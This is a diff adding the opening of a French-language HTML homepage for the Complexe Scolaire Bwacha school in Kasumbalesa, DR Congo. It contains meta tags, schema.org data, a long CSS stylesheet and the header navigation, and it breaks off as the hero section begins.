@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>COMPLEXE SCOLAIRE BWACHA</title>
+    <meta name="application-name" content="Complexe Scolaire Bwacha">
+    <meta name="description" content="Établissement scolaire d'excellence voué à conduire chaque apprenant vers la réussite, par le labeur, la rigueur, les valeurs et l'épanouissement personnel.">
+    <link rel="canonical" href="https://www.csbwacha.com/">
+    <link rel="icon" type="image/jpeg" href="https://www.csbwacha.com/favicon.jpg">
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebSite",
+      "name": "CS Bwacha",
+      "alternateName": "CS Bwacha",
+      "url": "https://www.csbwacha.com/"
+    }
+    </script>
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "EducationalOrganization",
+      "name": "Complexe Scolaire Bwacha",
+      "alternateName": "CS Bwacha",
+      "url": "https://www.csbwacha.com/",
+      "logo": "https://www.csbwacha.com/favicon.jpg",
+      "description": "Établissement scolaire d'excellence voué à conduire chaque apprenant vers la réussite, par le labeur, la rigueur, les valeurs et l'épanouissement personnel.",
+      "address": {
+        "@type": "PostalAddress",
+        "addressLocality": "Kasumbalesa",
+        "addressRegion": "Haut-Katanga",
+        "addressCountry": "République Démocratique du Congo"
+      },
+      "telephone": "+243973510555"
+    }
+    </script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root{
+            --vert:#1b7a3e;
+            --vert-clair:#2a9d54;
+            --vert-pale:#e8f3ec;
+            --blanc-casse:#faf8f4;
+            --blanc:#ffffff;
+            --noir:#141414;
+            --noir-doux:#2a2a2a;
+            --gris:#6b6b6b;
+            --bordure:#e3e0d8;
+        }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
+        html,body{overflow-x:hidden;width:100%}
+        body{background:var(--blanc-casse);display:flex;justify-content:center;padding:0;min-height:100vh}
+        .page{max-width:1200px;width:100%;background:var(--blanc-casse);min-height:100vh;overflow-x:hidden;position:relative}
+        .top-bar{background:var(--noir);color:#c9c9c9;padding:8px 6%;font-size:0.78rem;display:flex;justify-content:flex-end;align-items:center;flex-wrap:wrap}
+        .top-bar a{color:#c9c9c9;text-decoration:none;margin:0 8px;transition:0.3s}
+        .top-bar a:hover{color:var(--vert-clair)}
+        .top-bar .social-icons a{margin:0 6px;font-size:0.9rem}
+        .header-main{background:var(--blanc);padding:18px 6%;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;border-bottom:3px solid var(--vert);position:sticky;top:0;z-index:100;box-shadow:0 4px 20px rgba(20,20,20,0.05)}
+        .logo{display:flex;align-items:center;gap:14px}
+        .logo-icon{width:48px;height:48px;border-radius:14px;background:var(--vert);display:flex;align-items:center;justify-content:center;font-size:1.5rem;color:#fff;font-weight:900;box-shadow:0 4px 16px rgba(27,122,62,0.3);transition:transform 0.4s}
+        .logo-icon:hover{transform:scale(1.08) rotate(-4deg)}
+        .logo h1{font-size:1.5rem;font-weight:900;color:var(--noir);letter-spacing:-0.5px}
+        .logo h1 span{color:var(--vert)}
+        .nav-main{display:flex;gap:1.6rem;align-items:center;flex-wrap:wrap}
+        .nav-main a{color:var(--gris);text-decoration:none;font-weight:600;font-size:0.92rem;padding:8px 0;position:relative;transition:0.3s}
+        .nav-main a::after{content:'';position:absolute;bottom:0;left:0;width:0;height:2px;background:var(--vert);transition:width 0.3s}
+        .nav-main a:hover,.nav-main a.active{color:var(--noir)}
+        .nav-main a:hover::after,.nav-main a.active::after{width:100%}
+        .nav-main .btn-fondateur{background:var(--vert);color:#fff;padding:10px 24px;border-radius:12px;font-weight:700;font-size:0.88rem;transition:all 0.3s;box-shadow:0 4px 16px rgba(27,122,62,0.3)}
+        .nav-main .btn-fondateur:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(27,122,62,0.4);background:var(--vert-clair);color:#fff}
+        .nav-main .btn-fondateur::after{display:none}
+        .hero-section{padding:80px 6% 70px;position:relative;overflow:hidden;display:grid;grid-template-columns:1.3fr 0.7fr;gap:50px;align-items:center;background:var(--blanc-casse)}
+        .hero-section::before{content:'';position:absolute;top:-30%;right:-15%;width:500px;height:500px;background:radial-gradient(circle,rgba(27,122,62,0.08) 0%,transparent 70%);border-radius:50%;pointer-events:none}
+        .hero-section::after{content:'';position:absolute;bottom:-40%;left:-10%;width:400px;height:400px;background:radial-gradient(circle,rgba(42,157,84,0.05) 0%,transparent 70%);border-radius:50%;pointer-events:none}
+        .hero-badge{display:inline-flex;align-items:center;gap:8px;background:var(--vert-pale);border:1px solid rgba(27,122,62,0.25);border-radius:30px;padding:6px 18px;font-size:0.75rem;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;color:var(--vert);margin-bottom:18px}
+        .hero-section h2{font-size:3.4rem;font-weight:900;line-height:1.08;letter-spacing:-1.5px;color:var(--noir);margin-bottom:20px}
+        .hero-section h2 .gradient{color:var(--vert)}
+        .hero-section p{font-size:1.1rem;line-height:1.85;color:var(--gris);margin-bottom:32px;max-width:92%}
+        .hero-buttons{display:flex;flex-wrap:wrap;gap:14px}
+        .btn-primary{background:var(--vert);color:#fff;padding:15px 38px;border-radius:14px;font-weight:700;font-size:0.98rem;text-decoration:none;transition:all 0.4s cubic-bezier(0.25,0.46,0.45,0.94);border:none;cursor:pointer;display:inline-flex;align-items:center;gap:10px;box-shadow:0 6px 24px rgba(27,122,62,0.3)}
+        .btn-primary:hover{transform:translateY(-4px) scale(1.03);box-shadow:0 14px 40px rgba(27,122,62,0.4);background:var(--vert-clair)}
+        .btn-outline{background:transparent;color:var(--noir);padding:15px 38px;border-radius:14px;font-weight:600;font-size:0.98rem;text-decoration:none;border:1.5px solid var(--noir);transition:all 0.4s;cursor:pointer;display:inline-flex;align-items:center;gap:10px}
+        .btn-outline:hover{background:var(--noir);color:#fff;transform:translateY(-4px)}
+        .hero-stats{background:var(--blanc);border:1px solid var(--bordure);border-radius:24px;padding:8px;position:relative;z-index:2;box-shadow:0 12px 40px rgba(20,20,20,0.06)}
+        .hero-stats .stat-row{display:flex;justify-content:space-between;align-items:center;padding:18px 22px;border-bottom:1px solid var(--bordure)}
+        .hero-stats .stat-row:last-child{border-bottom:0}
+        .hero-stats .stat-row .label{font-weight:500;color:var(--gris);font-size:0.92rem;display:flex;align-items:center;gap:10px}
+        .hero-stats .stat-row .label i{color:var(--vert);width:18px;text-align:center}
+        .hero-stats .stat-row .value{font-weight:700;font-size:0.95rem;color:var(--noir);text-align:right}
+        .section-title{font-size:1.8rem;font-weight:800;color:var(--noir);letter-spacing:-0.5px;padding:56px 6% 12px 6%;display:flex;align-items:center;gap:14px}
+        .section-title .line{flex:1;height:1px;background:linear-gradient(90deg,var(--bordure),transparent);margin-left:16px}
+        .section-title i{color:var(--vert);font-size:1.6rem;width:44px;height:44px;display:flex;align-items:center;justify-content:center;background:var(--vert-pale);border-radius:12px;flex-shrink:0}
+        .section-sub{font-size:1rem;color:var(--gris);padding:0 6% 20px 6%;max-width:800px;line-height:1.75}
+        .grid-3{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;padding:0 6% 40px 6%}
+        .card{background:var(--blanc);border:1px solid var(--bordure);border-radius:20px;padding:32px 28px;transition:all 0.4s cubic-bezier(0.25,0.46,0.45,0.94);position:relative;overflow:hidden;box-shadow:0 4px 16px rgba(20,20,20,0.03)}
+        .card::before{content:'';position:absolute;top:0;left:0;width:100%;height:4px;background:var(--vert);transform:scaleX(0);transform-origin:left;transition:transform 0.4s}
+        .card:hover::before{transform:scaleX(1)}
+        .card:hover{transform:translateY(-8px);border-color:var(--vert);box-shadow:0 20px 48px rgba(27,122,62,0.12)}
+        .card .card-icon{width:52px;height:52px;border-radius:14px;background:var(--vert-pale);display:flex;align-items:center;justify-content:center;font-size:1.4rem;color:var(--vert);margin-bottom:18px;transition:transform 0.4s}
+        .card:hover .card-icon{transform:scale(1.1) rotate(-6deg)}
+        .card h3{font-size:1.15rem;font-weight:700;color:var(--noir);margin-bottom:10px}
+        .card p{color:var(--gris);line-height:1.7;font-size:0.95rem}
+        .card .tag{display:inline-block;background:var(--vert);border-radius:20px;padding:4px 14px;font-size:0.72rem;font-weight:700;color:#fff;margin-top:14px;letter-spacing:0.5px}
+        .check-grid{list-style:none;padding:0 6% 32px 6%;display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+        .check-grid li{font-size:0.98rem;color:var(--noir);display:flex;align-items:center;gap:12px;padding:16px 20px;background:var(--blanc);border:1px solid var(--bordure);border-radius:14px;transition:all 0.3s}
+        .check-grid li:hover{border-color:var(--vert);transform:translateX(6px);box-shadow:0 8px 24px rgba(27,122,62,0.08)}
+        .check-grid li i{color:var(--vert);font-size:1.1rem}
+        .pillar-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;padding:0 6% 40px 6%}
+        .pillar-card{background:var(--blanc);border:1px solid var(--bordure);border-radius:20px;padding:36px 28px;text-align:center;transition:all 0.4s cubic-bezier(0.25,0.46,0.45,0.94);position:relative;overflow:hidden;box-shadow:0 4px 16px rgba(20,20,20,0.03)}
+        .pillar-card::after{content:'';position:absolute;bottom:0;left:50%;transform:translateX(-50%);width:60px;height:4px;background:var(--vert);border-radius:3px;transition:width 0.4s}
+        .pillar-card:hover::after{width:120px}
+        .pillar-card:hover{transform:translateY(-10px);border-color:var(--vert);box-shadow:0 24px 48px rgba(27,122,62,0.12)}
+        .pillar-card .pillar-icon{width:64px;height:64px;border-radius:18px;background:var(--vert-pale);display:flex;align-items:center;justify-content:center;font-size:1.8rem;color:var(--vert);margin:0 auto 18px;transition:transform 0.4s}
+        .pillar-card:hover .pillar-icon{transform:scale(1.12) rotate(-6deg)}
+        .pillar-card h3{font-size:1.15rem;font-weight:800;color:var(--noir);margin-bottom:10px;letter-spacing:1px}
+        .pillar-card p{font-size:0.92rem;color:var(--gris);line-height:1.7}
+        .pourquoi-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;padding:0 6% 40px 6%}
+        .pourquoi-card{background:var(--blanc);border:1px solid var(--bordure);border-radius:20px;padding:30px 28px;transition:all 0.4s cubic-bezier(0.25,0.46,0.45,0.94);position:relative;overflow:hidden;box-shadow:0 4px 16px rgba(20,20,20,0.03)}
+        .pourquoi-card:hover{transform:translateY(-8px);border-color:var(--vert);box-shadow:0 20px 48px rgba(27,122,62,0.1)}
+        .pourquoi-card h3{font-size:1.08rem;font-weight:700;color:var(--noir);margin-bottom:12px;display:flex;align-items:center;gap:12px}
+        .pourquoi-card h3 i{color:var(--vert);font-size:1.2rem;width:40px;height:40px;display:flex;align-items:center;justify-content:center;background:var(--vert-pale);border-radius:10px;flex-shrink:0}
+        .pourquoi-card p{color:var(--gris);line-height:1.7;font-size:0.93rem}
+        .pourquoi-card-full{grid-column:1/3;background:var(--noir);border:1px solid var(--noir);border-radius:20px;padding:34px 32px;transition:all 0.4s}
+        .pourquoi-card-full:hover{transform:translateY(-8px);box-shadow:0 20px 48px rgba(20,20,20,0.25)}
+        .pourquoi-card-full h3{font-size:1.15rem;font-weight:700;color:#fff;margin-bottom:12px;display:flex;align-items:center;gap:12px}
+        .pourquoi-card-full h3 i{color:#fff;font-size:1.3rem;width:44px;height:44px;display:flex;align-items:center;justify-content:center;background:var(--vert);border-radius:12px}
+        .pourquoi-card-full p{color:#c9c9c9;line-height:1.75;font-size:0.96rem}
+
+        .espace-parental-wrap{padding:0 6% 40px 6%}
+        .espace-parental-card{background:var(--blanc);border:1px solid var(--bordure);border-radius:28px;overflow:hidden;box-shadow:0 12px 48px rgba(20,20,20,0.06);transition:all 0.4s}
+        .espace-parental-card:hover{box-shadow:0 20px 60px rgba(27,122,62,0.12);border-color:var(--vert)}
+        .espace-top-banner{background:var(--noir);padding:24px 40px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:16px}
+        .espace-top-banner .etb-left{display:flex;align-items:center;gap:16px}
+        .espace-top-banner .etb-left .etb-icon{width:56px;height:56px;border-radius:16px;background:var(--vert);display:flex;align-items:center;justify-content:center;font-size:1.6rem;color:#fff;box-shadow:0 6px 20px rgba(27,122,62,0.4);flex-shrink:0}
+        .espace-top-banner .etb-left .etb-text h3{color:#fff;font-size:1.25rem;font-weight:800;margin-bottom:4px}
+        .espace-top-banner .etb-left .etb-text p{color:#c9c9c9;font-size:0.88rem}
+        .espace-top-banner .etb-left .etb-text p strong{color:var(--vert-clair)}
+        .espace-top-banner .etb-tag{background:rgba(42,157,84,0.15);border:1px solid rgba(42,157,84,0.4);border-radius:30px;padding:8px 20px;font-size:0.78rem;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--vert-clair);display:inline-flex;align-items:center;gap:8px}
+
+        .espace-dev-banner{background:var(--vert-pale);padding:18px 40px;display:flex;align-items:center;justify-content:center;gap:14px;flex-wrap:wrap;border-bottom:1px solid var(--bordure)}
+        .espace-dev-banner .dev-icon{width:44px;height:44px;border-radius:12px;background:var(--vert);display:flex;align-items:center;justify-content:center;font-size:1.15rem;color:#fff;flex-shrink:0;box-shadow:0 4px 14px rgba(27,122,62,0.3)}
+        .espace-dev-banner .dev-text{font-size:0.92rem;color:var(--noir-doux);text-align:left;line-height:1.5}
+        .espace-dev-banner .dev-text strong{color:var(--vert);font-weight:800;letter-spacing:0.3px}
+        .espace-dev-banner .dev-text span{color:var(--gris);font-size:0.85rem;display:block}
+
+        .espace-body{display:grid;grid-template-columns:1.2fr 1fr;gap:0}
+        .espace-col-left{padding:40px 42px;border-right:1px solid var(--bordure)}
+        .espace-col-left .ec-intro{font-size:1.02rem;color:var(--gris);line-height:1.8;margin-bottom:26px}
+        .espace-info-box{background:var(--vert-pale);border-left:4px solid var(--vert);border-radius:14px;padding:22px 24px;margin-bottom:22px}
+        .espace-info-box h4{font-size:1rem;font-weight:700;color:var(--noir);margin-bottom:8px;display:flex;align-items:center;gap:10px}
+        .espace-info-box h4 i{color:var(--vert)}
+        .espace-info-box p{font-size:0.9rem;color:var(--gris);line-height:1.65}
+        .espace-code-zone{display:flex;align-items:center;gap:16px;background:var(--blanc-casse);border:1px dashed var(--vert);border-radius:14px;padding:18px 22px}
+        .espace-code-zone .cz-icon{width:48px;height:48px;border-radius:12px;background:var(--vert);display:flex;align-items:center;justify-content:center;font-size:1.2rem;color:#fff;flex-shrink:0}
+        .espace-code-zone .cz-text{font-size:0.9rem;color:var(--gris);line-height:1.6}
+        .espace-code-zone .cz-text strong{color:var(--noir);display:block;margin-bottom:2px}
+        .espace-col-right{padding:40px 42px;background:var(--blanc-casse)}
+        .espace-col-right .ecr-title{font-size:0.78rem;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--vert);margin-bottom:18px;display:flex;align-items:center;gap:10px}
+        .espace-col-right .ecr-title::after{content:'';flex:1;height:1px;background:var(--bordure)}
+        .espace-feature{display:flex;gap:16px;align-items:flex-start;padding:14px 0;border-bottom:1px solid var(--bordure);transition:transform 0.3s}
+        .espace-feature:last-child{border-bottom:0}
+        .espace-feature:hover{transform:translateX(6px)}
+        .espace-feature .ef-num{width:36px;height:36px;border-radius:10px;background:var(--blanc);border:1px solid var(--bordure);display:flex;align-items:center;justify-content:center;font-weight:800;font-size:0.9rem;color:var(--vert);flex-shrink:0;transition:all 0.3s}
+        .espace-feature:hover .ef-num{background:var(--vert);color:#fff;border-color:var(--vert)}
+        .espace-feature .ef-content h4{font-size:0.95rem;font-weight:700;color:var(--noir);margin-bottom:3px}
+        .espace-feature .ef-content p{font-size:0.82rem;color:var(--gris);line-height:1.55}
+        .espace-footer-bar{background:var(--vert-pale);padding:26px 40px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:20px;border-top:1px solid var(--bordure)}
+        .espace-footer-bar .efb-text{display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+        .espace-footer-bar .efb-text i{font-size:1.3rem;color:var(--vert);width:44px;height:44px;display:flex;align-items:center;justify-content:center;background:var(--blanc);border-radius:12px;flex-shrink:0}
+        .espace-footer-bar .efb-text .efb-info h4{font-size:0.95rem;font-weight:700;color:var(--noir);margin-bottom:2px}
+        .espace-footer-bar .efb-text .efb-info p{font-size:0.82rem;color:var(--gris)}
+        .espace-footer-bar .efb-text .efb-info .phone-number{color:var(--vert);font-weight:700;cursor:pointer;transition:0.3s}
+        .espace-footer-bar .efb-text .efb-info .phone-number:hover{color:var(--vert-clair);text-decoration:underline}
+        .btn-espace{display:inline-flex;align-items:center;gap:14px;background:var(--vert);color:#fff;padding:18px 52px;border-radius:16px;font-weight:800;font-size:1.05rem;text-decoration:none;border:none;cursor:pointer;box-shadow:0 8px 32px rgba(27,122,62,0.35);transition:all 0.4s cubic-bezier(0.25,0.46,0.45,0.94);letter-spacing:0.5px;text-transform:uppercase}
+        .btn-espace:hover{transform:translateY(-6px) scale(1.04);box-shadow:0 16px 48px rgba(27,122,62,0.45);background:var(--vert-clair)}
+        .btn-espace:active{transform:scale(0.96)}
+        .btn-espace i{font-size:1.2rem}
+
+        .btn-niveaux{display:inline-flex;align-items:center;gap:12px;background:var(--noir);color:#fff;padding:15px 40px;border-radius:14px;font-weight:700;font-size:0.98rem;text-decoration:none;transition:all 0.4s;border:1px solid var(--noir);cursor:pointer}
+        .btn-niveaux:hover{background:var(--vert);border-color:var(--vert);transform:translateY(-4px);box-shadow:0 12px 32px rgba(27,122,62,0.3)}
+        .btn-niveaux i{font-size:1rem}
+        .facebook-section{background:var(--blanc);border:1px solid var(--bordure);border-radius:24px;padding:34px 36px;margin:0 6% 40px 6%;transition:all 0.4s;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:24px;box-shadow:0 8px 32px rgba(20,20,20,0.04)}
+        .facebook-section:hover{border-color:#1877f2;box-shadow:0 12px 40px rgba(24,119,242,0.15);transform:translateY(-3px)}
+        .facebook-section .fb-content{display:flex;align-items:center;gap:20px;flex-wrap:wrap}
+        .facebook-section .fb-content .fb-icon{font-size:2.8rem;color:#1877f2;background:rgba(24,119,242,0.08);padding:16px;border-radius:18px;transition:transform 0.4s}
+        .facebook-section:hover .fb-content .fb-icon{transform:scale(1.1) rotate(-6deg)}
+        .facebook-section .fb-content .fb-text h3{font-size:1.25rem;font-weight:800;color:var(--noir);margin-bottom:4px}
+        .facebook-section .fb-content .fb-text p{color:var(--gris);font-size:0.92rem;line-height:1.55}
+        .facebook-section .fb-content .fb-text p strong{color:#1877f2}
+        .facebook-section .btn-fb{background:#1877f2;color:#fff;padding:14px 38px;border-radius:14px;font-weight:700;font-size:1rem;text-decoration:none;display:inline-flex;align-items:center;gap:12px;transition:all 0.4s;border:none;cursor:pointer;box-shadow:0 6px 24px rgba(24,119,242,0.3)}
+        .facebook-section .btn-fb:hover{background:#166fe5;transform:translateY(-4px) scale(1.03);box-shadow:0 12px 40px rgba(24,119,242,0.4)}
+        .parent-message{background:var(--noir);border-radius:24px;padding:48px 6%;margin:0 6% 40px 6%;text-align:center;transition:all 0.4s;position:relative;overflow:hidden}
+        .parent-message::before{content:'"';position:absolute;top:-20px;left:30px;font-size:8rem;color:rgba(255,255,255,0.06);font-family:Georgia,serif;line-height:1}
+        .parent-message:hover{transform:translateY(-4px);box-shadow:0 20px 48px rgba(20,20,20,0.3)}
+        .parent-message p{font-size:1.05rem;line-height:1.85;color:#e0e0e0;max-width:780px;margin:0 auto;position:relative;z-index:1}
+        .parent-message .signature{font-weight:700;color:var(--vert-clair);margin-top:18px;font-size:1rem;position:relative;z-index:1}
+        .engagement-block{padding:0 6% 40px 6%;text-align:center;max-width:850px;margin:0 auto}
+        .engagement-block p{font-size:1.05rem;line-height:1.9;color:var(--gris)}
+        .engagement-block p strong{color:var(--vert)}
+        .gallery-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:16px;padding:0 6% 40px 6%}
+        .gallery-item{background:var(--blanc);border:1px solid var(--bordure);border-radius:18px;height:120px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;color:var(--gris);font-weight:600;font-size:0.85rem;transition:all 0.4s cubic-bezier(0.25,0.46,0.45,0.94);cursor:default;box-shadow:0 4px 16px rgba(20,20,20,0.03)}
+        .gallery-item i{font-size:1.8rem;color:var(--vert);transition:transform 0.4s}
+        .gallery-item:hover{background:var(--vert-pale);border-color:var(--vert);transform:translateY(-6px) scale(1.03);box-shadow:0 12px 32px rgba(27,122,62,0.15);color:var(--noir)}
+        .gallery-item:hover i{transform:scale(1.2) rotate(-6deg)}
+        .contact-section{display:grid;grid-template-columns:1.5fr 1fr;gap:36px;background:var(--blanc);border:1px solid var(--bordure);border-radius:24px;margin:0 6% 40px 6%;padding:40px;transition:all 0.4s;box-shadow:0 8px 32px rgba(20,20,20,0.04)}
+        .contact-section:hover{border-color:var(--vert);box-shadow:0 12px 40px rgba(27,122,62,0.1)}
+        .contact-title{font-weight:800;font-size:1.25rem;color:var(--noir);margin-bottom:20px;display:flex;align-items:center;gap:12px}
+        .contact-title i{color:var(--vert)}
+        .contact-item{display:flex;align-items:center;gap:16px;padding:14px 0;color:var(--noir-doux);border-bottom:1px solid var(--bordure);transition:transform 0.3s}
+        .contact-item:hover{transform:translateX(6px)}
+        .contact-item:last-child{border-bottom:0}
+        .contact-item i{width:40px;height:40px;display:flex;align-items:center;justify-content:center;font-size:1rem;color:var(--vert);background:var(--vert-pale);border-radius:10px;flex-shrink:0}
+        .contact-item span{font-weight:500;font-size:0.95rem}
+        .contact-side{border-left:1px solid var(--bordure);padding-left:32px;display:flex;flex-direction:column;justify-content:center}
+        .contact-side .motto{font-weight:800;color:var(--vert);font-size:1.1rem;letter-spacing:1px;line-height:1.6}
+        .contact-side .copy-small{margin-top:12px;color:var(--gris);font-size:0.85rem}
+        .footer{background:var(--noir);color:#c9c9c9;padding:48px 6% 28px;margin-top:20px}
+        .footer .inner{display:grid;grid-template-columns:2fr 1fr 1fr;gap:48px;max-width:1200px;margin:0 auto}
+        .footer h4{color:#fff;font-weight:700;margin-bottom:16px;font-size:1rem;letter-spacing:0.5px}
+        .footer p{font-size:0.9rem;line-height:1.7;max-width:320px;color:#c9c9c9}
+        .footer a{color:#c9c9c9;text-decoration:none;display:block;margin:8px 0;font-size:0.9rem;transition:0.3s}
+        .footer a:hover{color:var(--vert-clair);transform:translateX(4px)}
+        .footer a i{color:var(--vert-clair);margin-right:8px;width:16px}
+        .footer .copy{text-align:center;border-top:1px solid #2a2a2a;padding-top:22px;margin-top:32px;font-size:0.82rem;color:#8a8a8a}
+        .footer .phone-link{cursor:pointer;display:inline-block}
+        .phone-popup-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(20,20,20,0.6);backdrop-filter:blur(8px);z-index:99999;justify-content:center;align-items:center}
+        .phone-popup-overlay.active{display:flex}
+        .phone-popup-box{background:#fff;border:1px solid var(--bordure);border-radius:24px;padding:40px 36px;max-width:420px;width:92%;text-align:center;box-shadow:0 40px 80px rgba(20,20,20,0.35);transform:scale(0.95) translateY(20px);transition:all 0.7s cubic-bezier(0.34,1.56,0.64,1)}
+        .phone-popup-overlay.active .phone-popup-box{transform:scale(1) translateY(0)}
+        .phone-popup-box .phone-icon{font-size:3rem;color:var(--vert);display:block;margin-bottom:8px}
+        .phone-popup-box h2{font-size:1.3rem;font-weight:800;color:var(--noir);margin-bottom:6px}
+        .phone-popup-box .phone-number{font-size:1.4rem;font-weight:700;color:var(--vert);margin-bottom:20px;display:block}
+        .phone-popup-box .phone-buttons{display:flex;flex-direction:column;gap:12px}
+        .phone-popup-box .phone-buttons a{display:flex;align-items:center;justify-content:center;gap:12px;padding:14px;border-radius:14px;font-weight:700;font-size:1.05rem;text-decoration:none;transition:all 0.3s}
+        .phone-popup-box .phone-buttons .btn-whatsapp{background:#25D366;color:#fff}
+        .phone-popup-box .phone-buttons .btn-whatsapp:hover{transform:scale(1.03);box-shadow:0 8px 24px rgba(37,211,102,0.4)}
+        .phone-popup-box .phone-buttons .btn-call{background:var(--noir);color:#fff}
+        .phone-popup-box .phone-buttons .btn-call:hover{transform:scale(1.03);box-shadow:0 8px 24px rgba(20,20,20,0.4);background:var(--vert)}
+        .phone-popup-box .btn-close-phone{background:transparent;border:none;color:var(--gris);font-size:0.9rem;cursor:pointer;margin-top:12px;padding:8px;transition:0.3s}
+        .phone-popup-box .btn-close-phone:hover{color:var(--noir)}
+        .loader-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(20,20,20,0.75);backdrop-filter:blur(8px);z-index:999999;justify-content:center;align-items:center}
+        .loader-overlay.active{display:flex}
+        .loader-box{background:#fff;border-radius:28px;padding:48px 56px;max-width:480px;width:92%;text-align:center;box-shadow:0 40px 80px rgba(20,20,20,0.4);transform:scale(0.9);animation:zoomInLoader 0.5s cubic-bezier(0.34,1.56,0.64,1) forwards}
+        @keyframes zoomInLoader{from{transform:scale(0.9);opacity:0}to{transform:scale(1);opacity:1}}
+        .loader-box .loader-icon{font-size:4rem;color:var(--vert);display:block;margin-bottom:8px}
+        .loader-box h2{font-size:1.5rem;font-weight:800;color:var(--noir);margin-bottom:4px}
+        .loader-box .loader-sub{font-size:0.95rem;color:var(--gris);margin-bottom:24px}
+        .loader-box .loader-sub strong{color:var(--vert)}
+        .progress-container{width:100%;background:var(--vert-pale);border-radius:50px;height:10px;overflow:hidden;margin-bottom:12px}
+        .progress-bar{height:100%;width:0%;background:var(--vert);border-radius:50px;transition:width 0.15s linear}
+        .progress-text{font-size:0.85rem;font-weight:600;color:var(--noir);margin-bottom:6px}
+        .loader-message{font-size:0.95rem;color:var(--gris);display:flex;align-items:center;justify-content:center;gap:10px}
+        .loader-message i{color:var(--vert);font-size:1.1rem;animation:spin 1s linear infinite}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        .fade-in{opacity:0;transform:translateY(40px);transition:all 0.9s cubic-bezier(0.25,0.46,0.45,0.94)}
+        .fade-in.visible{opacity:1;transform:translateY(0)}
+        .fade-in-left{opacity:0;transform:translateX(-50px);transition:all 0.9s cubic-bezier(0.25,0.46,0.45,0.94)}
+        .fade-in-left.visible{opacity:1;transform:translateX(0)}
+        .fade-in-right{opacity:0;transform:translateX(50px);transition:all 0.9s cubic-bezier(0.25,0.46,0.45,0.94)}
+        .fade-in-right.visible{opacity:1;transform:translateX(0)}
+        .fade-in-scale{opacity:0;transform:scale(0.9);transition:all 0.9s cubic-bezier(0.25,0.46,0.45,0.94)}
+        .fade-in-scale.visible{opacity:1;transform:scale(1)}
+        .fade-in-rotate{opacity:0;transform:rotate(-6deg) scale(0.92);transition:all 1s cubic-bezier(0.25,0.46,0.45,0.94)}
+        .fade-in-rotate.visible{opacity:1;transform:rotate(0deg) scale(1)}
+        @media(max-width:1024px){
+            .hero-section{grid-template-columns:1fr;padding:48px 6% 40px}
+            .hero-section p{max-width:100%}
+            .grid-3{grid-template-columns:1fr 1fr}
+            .pillar-grid{grid-template-columns:1fr 1fr}
+            .pourquoi-grid{grid-template-columns:1fr 1fr}
+            .check-grid{grid-template-columns:1fr 1fr}
+            .espace-body{grid-template-columns:1fr}
+            .espace-col-left{border-right:0;border-bottom:1px solid var(--bordure)}
+        }
+        @media(max-width:768px){
+            .header-main{flex-direction:column;gap:14px;align-items:flex-start}
+            .nav-main{gap:1rem;flex-wrap:wrap}
+            .grid-3{grid-template-columns:1fr}
+            .pillar-grid{grid-template-columns:1fr}
+            .gallery-grid{grid-template-columns:repeat(3,1fr)}
+            .contact-section{grid-template-columns:1fr}
+            .contact-side{border-left:0;border-top:1px solid var(--bordure);padding-left:0;padding-top:20px}
+            .hero-section h2{font-size:2.2rem}
+            .footer .inner{grid-template-columns:1fr;gap:28px}
+            .logo h1{font-size:1.6rem}
+            .pourquoi-grid{grid-template-columns:1fr}
+            .pourquoi-card-full{grid-column:1/2}
+            .espace-top-banner{padding:20px 24px}
+            .espace-dev-banner{padding:16px 24px;text-align:center}
+            .espace-dev-banner .dev-text{text-align:center}
+            .espace-col-left,.espace-col-right{padding:28px 24px}
+            .espace-footer-bar{padding:22px 24px;flex-direction:column;align-items:stretch}
+            .btn-espace{width:100%;justify-content:center;padding:16px 24px;font-size:0.95rem}
+        }
+        @media(max-width:480px){
+            .gallery-grid{grid-template-columns:1fr 1fr}
+            .check-grid{grid-template-columns:1fr}
+            .hero-buttons .btn-primary,.hero-buttons .btn-outline{width:100%;justify-content:center}
+            .top-bar{flex-direction:column;gap:4px;text-align:center;font-size:0.7rem}
+            .logo h1{font-size:1.3rem}
+            .hero-section h2{font-size:1.8rem}
+        }
+    </style>
+</head>
+<body>
+<div class="page">
+    <div class="top-bar">
+        <div class="social-icons">
+            <a href="#"><i class="fab fa-facebook-f"></i></a>
+            <a href="#"><i class="fab fa-twitter"></i></a>
+            <a href="#"><i class="fab fa-linkedin-in"></i></a>
+            <a href="#"><i class="fab fa-youtube"></i></a>
+        </div>
+    </div>
+
+    <div class="header-main">
+        <div class="logo">
+            <div class="logo-icon">B</div>
+            <h1>CS <span>BWACHA</span></h1>
+        </div>
+        <div class="nav-main">
+            <a href="#" class="active">Accueil</a>
+            <a href="https://www.csbwacha.com/about">À propos</a>
+            <a href="niveaux.html">Niveaux</a>
+            <a href="enseignants.html">Enseignants</a>
+            <a href="fondateur.html" class="btn-fondateur"><i class="fas fa-user-tie"></i> Fondateur</a>
+        </div>
+    </div>
+
+    <div class="hero-section">
